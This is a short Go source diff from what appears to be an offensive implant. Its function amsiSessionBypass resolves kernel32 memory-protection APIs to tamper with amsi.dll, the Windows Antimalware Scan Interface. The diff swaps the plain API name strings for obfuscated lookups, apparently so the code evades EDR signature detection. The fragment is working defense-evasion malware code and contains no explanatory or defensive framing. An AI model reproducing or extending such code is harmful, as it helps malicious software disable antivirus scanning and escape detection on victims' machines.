@@ -13,9 +13,9 @@ func amsiSessionBypass() string {
 		return "AMSI session bypass: disabled by EDR strategy"
 	}
 	k32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := k32.NewProc("GetModuleHandleW")
-	getProcAddress := k32.NewProc("GetProcAddress")
-	virtualProtect := k32.NewProc("VirtualProtect")
+	getModuleHandle := k32.NewProc(s(SProcGModuleW))
+	getProcAddress := k32.NewProc(s(SProcGProcAddr))
+	virtualProtect := k32.NewProc(s(SProcVProtect))
 
 	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
 	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
